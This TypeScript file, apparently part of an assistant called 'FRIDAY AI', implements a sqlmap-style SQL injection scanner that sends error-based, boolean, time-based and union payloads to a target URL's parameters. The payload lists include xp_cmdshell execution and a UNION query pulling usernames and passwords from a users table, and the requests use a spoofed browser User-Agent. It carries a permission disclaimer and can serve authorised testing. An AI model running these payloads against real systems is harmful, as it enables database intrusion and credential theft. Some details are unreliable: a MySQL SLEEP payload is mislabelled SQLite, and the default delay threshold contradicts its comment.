/**
 * FRIDAY AI — SQLMap OSINT/Pentest Service (Pure JS — No Python Required)
 * SQL Injection vulnerability detection and testing
 * Inspired by: https://github.com/sqlmapproject/sqlmap
 *
 * Techniques implemented:
 *  - Error-Based Detection    → DB errors in response
 *  - Boolean-Based Blind      → True/false response difference
 *  - Time-Based Blind         → Response delay detection
 *  - Union-Based              → UNION SELECT payloads
 *  - Parameter tampering      → GET/POST params
 *
 * ⚠️ LEGAL DISCLAIMER: Only use on systems you own or have permission to test!
 */

import https from "https";
import http from "http";

// ---------------------------------------------------------------------------
// Interfaces
// ---------------------------------------------------------------------------
export interface SqlInjectionPoint {
  parameter: string;
  paramType: "GET" | "POST" | "COOKIE" | "HEADER";
  technique: "error-based" | "boolean-based" | "time-based" | "union-based";
  payload: string;
  evidence: string;
  confidence: "high" | "medium" | "low";
  dbmsHint?: string;
}

export interface SqlMapReport {
  url: string;
  isVulnerable: boolean;
  injectionPoints: SqlInjectionPoint[];
  dbmsDetected?: string;
  techniquesDetected: string[];
  testedParameters: string[];
  requestCount: number;
  summary: string;
  scanDurationMs: number;
  riskLevel: "critical" | "high" | "medium" | "low" | "none";
}

export interface SqlPayload {
  payload: string;
  technique: "error-based" | "boolean-based" | "time-based" | "union-based";
  description: string;
}

// ---------------------------------------------------------------------------
// SQL Injection Payloads Database
// ---------------------------------------------------------------------------
const ERROR_BASED_PAYLOADS: SqlPayload[] = [
  // MySQL
  { payload: "'", technique: "error-based", description: "Single quote - MySQL" },
  { payload: "''", technique: "error-based", description: "Double single quote" },
  { payload: "1'", technique: "error-based", description: "Integer + quote - MySQL" },
  { payload: "1 AND 1=1--", technique: "error-based", description: "AND true - MySQL" },
  { payload: "' OR '1'='1", technique: "error-based", description: "OR true - MySQL" },
  { payload: "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--+", technique: "error-based", description: "MySQL EXTRACTVALUE error" },
  { payload: "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+", technique: "error-based", description: "MySQL group by error" },
  // MSSQL
  { payload: "1' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--", technique: "error-based", description: "MSSQL CONVERT error" },
  { payload: "'; EXEC xp_cmdshell('ping 127.0.0.1')--", technique: "error-based", description: "MSSQL xp_cmdshell" },
  // PostgreSQL
  { payload: "1 AND 1=CAST((SELECT version()) AS int)--", technique: "error-based", description: "PostgreSQL CAST error" },
  // SQLite
  { payload: "1 AND 1=1 UNION SELECT sqlite_version()--", technique: "error-based", description: "SQLite version" },
  // Oracle
  { payload: "1 AND 1=CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1))--", technique: "error-based", description: "Oracle error" },
];

const BOOLEAN_PAYLOADS: SqlPayload[] = [
  { payload: "1 AND 1=1", technique: "boolean-based", description: "AND true condition" },
  { payload: "1 AND 1=2", technique: "boolean-based", description: "AND false condition" },
  { payload: "1' AND '1'='1", technique: "boolean-based", description: "String AND true" },
  { payload: "1' AND '1'='2", technique: "boolean-based", description: "String AND false" },
  { payload: "1 AND 1=1--", technique: "boolean-based", description: "AND true with comment" },
  { payload: "1 AND 1=2--", technique: "boolean-based", description: "AND false with comment" },
  { payload: "' OR 1=1--", technique: "boolean-based", description: "OR true bypass" },
  { payload: "' OR 1=2--", technique: "boolean-based", description: "OR false" },
  { payload: "1) AND (1=1", technique: "boolean-based", description: "Parenthesis AND true" },
  { payload: "1) AND (1=2", technique: "boolean-based", description: "Parenthesis AND false" },
];

const TIME_BASED_PAYLOADS: SqlPayload[] = [
  // MySQL
  { payload: "1 AND SLEEP(3)--", technique: "time-based", description: "MySQL SLEEP" },
  { payload: "1' AND SLEEP(3)--", technique: "time-based", description: "MySQL SLEEP string" },
  { payload: "1; SELECT SLEEP(3)--", technique: "time-based", description: "MySQL stacked SLEEP" },
  // MSSQL
  { payload: "1; WAITFOR DELAY '0:0:3'--", technique: "time-based", description: "MSSQL WAITFOR" },
  { payload: "1' WAITFOR DELAY '0:0:3'--", technique: "time-based", description: "MSSQL WAITFOR string" },
  // PostgreSQL
  { payload: "1; SELECT pg_sleep(3)--", technique: "time-based", description: "PostgreSQL pg_sleep" },
  { payload: "1' AND (SELECT 1 FROM pg_sleep(3))='1", technique: "time-based", description: "PostgreSQL subquery sleep" },
  // SQLite
  { payload: "1 AND (SELECT 1337 FROM (SELECT(SLEEP(3)))a)--", technique: "time-based", description: "SQLite sleep" },
];

const UNION_PAYLOADS: SqlPayload[] = [
  { payload: "' UNION SELECT NULL--", technique: "union-based", description: "UNION 1 column" },
  { payload: "' UNION SELECT NULL,NULL--", technique: "union-based", description: "UNION 2 columns" },
  { payload: "' UNION SELECT NULL,NULL,NULL--", technique: "union-based", description: "UNION 3 columns" },
  { payload: "' UNION SELECT 1,2,3--", technique: "union-based", description: "UNION numbers" },
  { payload: "1 UNION SELECT table_name FROM information_schema.tables--", technique: "union-based", description: "UNION tables" },
  { payload: "' UNION ALL SELECT NULL,NULL,NULL--", technique: "union-based", description: "UNION ALL 3 cols" },
  { payload: "1 UNION SELECT username,password FROM users--", technique: "union-based", description: "UNION users table" },
];

// ---------------------------------------------------------------------------
// DB Error Signatures
// ---------------------------------------------------------------------------
const DB_ERROR_SIGNATURES: Record<string, string[]> = {
  MySQL: [
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch_array",
    "mysql_num_rows",
    "supplied argument is not a valid mysql",
    "column count doesn't match",
    "unclosed quotation mark",
    "mysql server version for the right syntax",
    "check the manual that corresponds to your mysql",
  ],
  MSSQL: [
    "microsoft sql server",
    "incorrect syntax near",
    "odbc sql server driver",
    "sqlserver jdbc driver",
    "unclosed quotation mark after the character string",
    "[microsoft][odbc",
    "mssql_query()",
    "syntax error converting",
  ],
  PostgreSQL: [
    "pg_query()",
    "pg_exec()",
    "postgresql",
    "supplied argument is not a valid postgresql",
    "error: parser: parse error",
    "pgsql error",
    "warning: pg_",
  ],
  Oracle: [
    "oracle error",
    "ora-",
    "oracle driver",
    "quoted string not properly terminated",
    "oci_parse()",
  ],
  SQLite: [
    "sqlite_",
    "sqlite error",
    "sqlite3::",
    "system.data.sqlite",
    "near \"syntax\"",
  ],
  MongoDB: [
    "mongodb",
    "invalid bson",
    "uncaught exception",
    "syntaxerror",
    "bson",
  ],
};

// ---------------------------------------------------------------------------
// HTTP Request Helper
// ---------------------------------------------------------------------------
interface HttpResponse {
  statusCode: number;
  body: string;
  responseTimeMs: number;
  headers: Record<string, string>;
}

async function makeRequest(
  url: string,
  method: "GET" | "POST",
  body?: string,
  headers?: Record<string, string>
): Promise<HttpResponse> {
  return new Promise((resolve) => {
    const start = Date.now();
    const parsed = new URL(url);
    const lib = parsed.protocol === "https:" ? https : http;

    const defaultHeaders: Record<string, string> = {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
      "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.5",
      "Connection": "close",
      ...headers,
    };

    if (method === "POST" && body) {
      defaultHeaders["Content-Type"] = "application/x-www-form-urlencoded";
      defaultHeaders["Content-Length"] = String(Buffer.byteLength(body));
    }

    const options = {
      hostname: parsed.hostname,
      port: parsed.port || (parsed.protocol === "https:" ? 443 : 80),
      path: parsed.pathname + parsed.search,
      method,
      headers: defaultHeaders,
      timeout: 15000,
    };

    const req = lib.request(options, (res) => {
      let data = "";
      res.on("data", (chunk) => {
        if (data.length < 50000) data += chunk.toString(); // limit read
      });
      res.on("end", () => {
        resolve({
          statusCode: res.statusCode || 0,
          body: data,
          responseTimeMs: Date.now() - start,
          headers: res.headers as Record<string, string>,
        });
      });
    });

    req.on("timeout", () => {
      req.destroy();
      resolve({ statusCode: 0, body: "", responseTimeMs: Date.now() - start, headers: {} });
    });

    req.on("error", () => {
      resolve({ statusCode: 0, body: "", responseTimeMs: Date.now() - start, headers: {} });
    });

    if (method === "POST" && body) req.write(body);
    req.end();
  });
}

// ---------------------------------------------------------------------------
// Detection Helpers
// ---------------------------------------------------------------------------
function detectDbmsFromError(body: string): string | undefined {
  const lower = body.toLowerCase();
  for (const [dbms, signatures] of Object.entries(DB_ERROR_SIGNATURES)) {
    for (const sig of signatures) {
      if (lower.includes(sig)) return dbms;
    }
  }
  return undefined;
}

function hasDbError(body: string): { found: boolean; evidence: string; dbms?: string } {
  const lower = body.toLowerCase();
  for (const [dbms, signatures] of Object.entries(DB_ERROR_SIGNATURES)) {
    for (const sig of signatures) {
      if (lower.includes(sig)) {
        // Extract snippet around error
        const idx = lower.indexOf(sig);
        const snippet = body.substring(Math.max(0, idx - 20), Math.min(body.length, idx + 100));
        return { found: true, evidence: snippet.trim(), dbms };
      }
    }
  }
  return { found: false, evidence: "" };
}

function buildGetUrl(baseUrl: string, param: string, payload: string): string {
  try {
    const url = new URL(baseUrl);
    url.searchParams.set(param, payload);
    return url.toString();
  } catch {
    return `${baseUrl}?${param}=${encodeURIComponent(payload)}`;
  }
}

// ---------------------------------------------------------------------------
// SQLMap Service
// ---------------------------------------------------------------------------
class SqlMapService {

  /** Full SQL injection scan on a URL */
  async scan(
    targetUrl: string,
    options?: {
      method?: "GET" | "POST";
      postData?: string;          // e.g. "user=test&pass=abc"
      params?: string[];          // specific params to test (auto-detected if empty)
      cookies?: string;
      headers?: Record<string, string>;
      techniques?: ("error" | "boolean" | "time" | "union")[];
      timeThreshold?: number;     // ms — time-based threshold (default: 3000)
      skipErrorBased?: boolean;
    }
  ): Promise<SqlMapReport> {
    const startTime = Date.now();
    const injectionPoints: SqlInjectionPoint[] = [];
    const techniquesDetected = new Set<string>();
    let requestCount = 0;
    let dbmsDetected: string | undefined;

    const method = options?.method || "GET";
    const timeThreshold = options?.timeThreshold || 2800;
    const extraHeaders: Record<string, string> = {
      ...options?.headers,
      ...(options?.cookies ? { Cookie: options.cookies } : {}),
    };

    // --- Auto-detect parameters ---
    let testParams: string[] = options?.params || [];
    if (testParams.length === 0) {
      try {
        const parsed = new URL(targetUrl);
        parsed.searchParams.forEach((_, key) => testParams.push(key));
      } catch {}

      // Parse POST data params
      if (method === "POST" && options?.postData) {
        const parts = options.postData.split("&");
        for (const part of parts) {
          const key = part.split("=")[0];
          if (key && !testParams.includes(key)) testParams.push(key);
        }
      }
    }

    if (testParams.length === 0) testParams = ["id", "q", "search", "page", "user", "item"];

    // =====================================================================
    // 1) GET BASELINE RESPONSE
    // =====================================================================
    const baseline = await makeRequest(targetUrl, method, options?.postData, extraHeaders);
    requestCount++;
    const baselineLength = baseline.body.length;
    const baselineTime = baseline.responseTimeMs;

    const techniques = options?.techniques || ["error", "boolean", "time", "union"];

    for (const param of testParams) {
      // ==================================================================
      // TECHNIQUE 1: ERROR-BASED
      // ==================================================================
      if (techniques.includes("error") && !options?.skipErrorBased) {
        for (const sqlPayload of ERROR_BASED_PAYLOADS.slice(0, 6)) {
          const testUrl = method === "GET"
            ? buildGetUrl(targetUrl, param, sqlPayload.payload)
            : targetUrl;

          const postBody = method === "POST" && options?.postData
            ? options.postData.replace(
                new RegExp(`(${param}=)[^&]*`),
                `$1${encodeURIComponent(sqlPayload.payload)}`
              )
            : undefined;

          const resp = await makeRequest(testUrl, method, postBody, extraHeaders);
          requestCount++;

          const errorCheck = hasDbError(resp.body);
          if (errorCheck.found) {
            dbmsDetected = dbmsDetected || errorCheck.dbms;
            techniquesDetected.add("error-based");
            injectionPoints.push({
              parameter: param,
              paramType: method === "POST" ? "POST" : "GET",
              technique: "error-based",
              payload: sqlPayload.payload,
              evidence: errorCheck.evidence,
              confidence: "high",
              dbmsHint: errorCheck.dbms,
            });
            break; // found for this param, move to next
          }
        }
      }

      // ==================================================================
      // TECHNIQUE 2: BOOLEAN-BASED BLIND
      // ==================================================================
      if (techniques.includes("boolean")) {
        // Test TRUE payload vs FALSE payload — response size/content should differ
        const truePayloads = BOOLEAN_PAYLOADS.filter((_, i) => i % 2 === 0);
        const falsePayloads = BOOLEAN_PAYLOADS.filter((_, i) => i % 2 === 1);

        for (let i = 0; i < Math.min(truePayloads.length, falsePayloads.length); i++) {
          const trueUrl = method === "GET" ? buildGetUrl(targetUrl, param, truePayloads[i].payload) : targetUrl;
          const falseUrl = method === "GET" ? buildGetUrl(targetUrl, param, falsePayloads[i].payload) : targetUrl;

          const [trueResp, falseResp] = await Promise.all([
            makeRequest(trueUrl, method, undefined, extraHeaders),
            makeRequest(falseUrl, method, undefined, extraHeaders),
          ]);
          requestCount += 2;

          const trueLen = trueResp.body.length;
          const falseLen = falseResp.body.length;
          const diff = Math.abs(trueLen - falseLen);
          const baseDiff = Math.abs(trueLen - baselineLength);

          // Significant difference between true/false but true matches baseline
          if (diff > 50 && baseDiff < diff * 0.5) {
            techniquesDetected.add("boolean-based");
            injectionPoints.push({
              parameter: param,
              paramType: method === "POST" ? "POST" : "GET",
              technique: "boolean-based",
              payload: `TRUE: ${truePayloads[i].payload} | FALSE: ${falsePayloads[i].payload}`,
              evidence: `Response size differs by ${diff} bytes (TRUE: ${trueLen}, FALSE: ${falseLen})`,
              confidence: diff > 200 ? "high" : "medium",
            });
            break;
          }
        }
      }

      // ==================================================================
      // TECHNIQUE 3: TIME-BASED BLIND
      // ==================================================================
      if (techniques.includes("time")) {
        for (const sqlPayload of TIME_BASED_PAYLOADS.slice(0, 4)) {
          const testUrl = method === "GET"
            ? buildGetUrl(targetUrl, param, sqlPayload.payload)
            : targetUrl;

          const postBody = method === "POST" && options?.postData
            ? options.postData.replace(
                new RegExp(`(${param}=)[^&]*`),
                `$1${encodeURIComponent(sqlPayload.payload)}`
              )
            : undefined;

          const resp = await makeRequest(testUrl, method, postBody, extraHeaders);
          requestCount++;

          const delay = resp.responseTimeMs - baselineTime;
          if (delay >= timeThreshold) {
            const dbmsHint = sqlPayload.description.split(" ")[0]; // MySQL, MSSQL, etc.
            techniquesDetected.add("time-based");
            dbmsDetected = dbmsDetected || dbmsHint;
            injectionPoints.push({
              parameter: param,
              paramType: method === "POST" ? "POST" : "GET",
              technique: "time-based",
              payload: sqlPayload.payload,
              evidence: `Response delayed by ${delay}ms (baseline: ${baselineTime}ms, actual: ${resp.responseTimeMs}ms)`,
              confidence: delay > timeThreshold * 1.5 ? "high" : "medium",
              dbmsHint,
            });
            break;
          }
        }
      }

      // ==================================================================
      // TECHNIQUE 4: UNION-BASED
      // ==================================================================
      if (techniques.includes("union")) {
        for (const sqlPayload of UNION_PAYLOADS.slice(0, 5)) {
          const testUrl = method === "GET"
            ? buildGetUrl(targetUrl, param, sqlPayload.payload)
            : targetUrl;

          const resp = await makeRequest(testUrl, method, undefined, extraHeaders);
          requestCount++;

          // Look for UNION signs: "NULL" in response or column count error
          const lower = resp.body.toLowerCase();
          const errorCheck = hasDbError(resp.body);

          if (resp.statusCode === 200 && resp.body.length !== baselineLength &&
              (lower.includes("null") || lower.includes("union") || errorCheck.found)) {
            techniquesDetected.add("union-based");
            dbmsDetected = dbmsDetected || errorCheck.dbms;
            injectionPoints.push({
              parameter: param,
              paramType: method === "POST" ? "POST" : "GET",
              technique: "union-based",
              payload: sqlPayload.payload,
              evidence: `UNION payload changed response by ${Math.abs(resp.body.length - baselineLength)} bytes`,
              confidence: "medium",
              dbmsHint: errorCheck.dbms,
            });
            break;
          }
        }
      }
    }

    // Deduplicate injection points (same param+technique)
    const seen = new Set<string>();
    const uniquePoints = injectionPoints.filter((p) => {
      const key = `${p.parameter}:${p.technique}`;
      if (seen.has(key)) return false;
      seen.add(key);
      return true;
    });

    const isVulnerable = uniquePoints.length > 0;
    const scanDurationMs = Date.now() - startTime;

    const riskLevel =
      uniquePoints.some(p => p.confidence === "high") ? "critical" :
      uniquePoints.some(p => p.confidence === "medium") ? "high" :
      uniquePoints.length > 0 ? "medium" : "none";

    const summary = isVulnerable
      ? `🚨 SQL Injection FOUND! "${targetUrl}"\n` +
        `💥 Vulnerable params: ${[...new Set(uniquePoints.map(p => p.parameter))].join(", ")}\n` +
        `🔧 Techniques: ${[...techniquesDetected].join(", ")}\n` +
        `🗄️ DBMS: ${dbmsDetected || "Unknown"}\n` +
        `📊 Total injection points: ${uniquePoints.length}\n` +
        `🔢 Requests made: ${requestCount}\n` +
        `⏱️ Scan time: ${(scanDurationMs / 1000).toFixed(1)}s`
      : `✅ No SQL Injection found in "${targetUrl}"\n` +
        `📊 Tested params: ${testParams.join(", ")}\n` +
        `🔢 Requests made: ${requestCount}\n` +
        `⏱️ Scan time: ${(scanDurationMs / 1000).toFixed(1)}s`;

    return {
      url: targetUrl,
      isVulnerable,
      injectionPoints: uniquePoints,
      dbmsDetected,
      techniquesDetected: [...techniquesDetected],
      testedParameters: testParams,
      requestCount,
      summary,
      scanDurationMs,
      riskLevel,
    };
  }

  /** Quick single-param test */
  async quickTest(url: string, param: string, payload: string): Promise<{
    vulnerable: boolean;
    statusCode: number;
    responseTime: number;
    bodyLength: number;
    errorFound?: string;
  }> {
    const testUrl = buildGetUrl(url, param, payload);
    const resp = await makeRequest(testUrl, "GET");
    const errorCheck = hasDbError(resp.body);

    return {
      vulnerable: errorCheck.found,
      statusCode: resp.statusCode,
      responseTime: resp.responseTimeMs,
      bodyLength: resp.body.length,
      errorFound: errorCheck.found ? errorCheck.evidence : undefined,
    };
  }

  /** Get all payloads (educational view) */
  getPayloads(): {
    errorBased: SqlPayload[];
    booleanBased: SqlPayload[];
    timeBased: SqlPayload[];
    unionBased: SqlPayload[];
  } {
    return {
      errorBased: ERROR_BASED_PAYLOADS,
      booleanBased: BOOLEAN_PAYLOADS,
      timeBased: TIME_BASED_PAYLOADS,
      unionBased: UNION_PAYLOADS,
    };
  }

  /** Check if URL has testable parameters */
  analyzeUrl(url: string): {
    url: string;
    params: string[];
    hasSuspiciousParams: boolean;
    recommendations: string[];
  } {
    let params: string[] = [];
    const suspicious = ["id", "user", "cat", "item", "search", "q", "page", "num", "type", "order"];
    const recommendations: string[] = [];

    try {
      const parsed = new URL(url);
      parsed.searchParams.forEach((_, key) => params.push(key));
    } catch {}

    const hasSuspiciousParams = params.some(p => suspicious.includes(p.toLowerCase()));

    if (params.length === 0) recommendations.push("No GET params found — try POST scan with postData");
    if (hasSuspiciousParams) recommendations.push("Suspicious param names found — high priority targets");
    if (url.includes("=")) recommendations.push("Parameters detected in URL");

    return { url, params, hasSuspiciousParams, recommendations };
  }

  getStatus() {
    return {
      installed: true,
      version: "2.0.0-purejs",
      description: "SQLMap OSINT — SQL Injection detection (Error, Boolean, Time, Union based)",
      techniques: ["Error-Based", "Boolean-Based Blind", "Time-Based Blind", "Union-Based"],
      supportedDbms: Object.keys(DB_ERROR_SIGNATURES),
      totalPayloads: ERROR_BASED_PAYLOADS.length + BOOLEAN_PAYLOADS.length + TIME_BASED_PAYLOADS.length + UNION_PAYLOADS.length,
      disclaimer: "⚠️ Use only on systems you own or have explicit permission to test!",
      engine: "native-http",
    };
  }
}

export const sqlMapService = new SqlMapService();
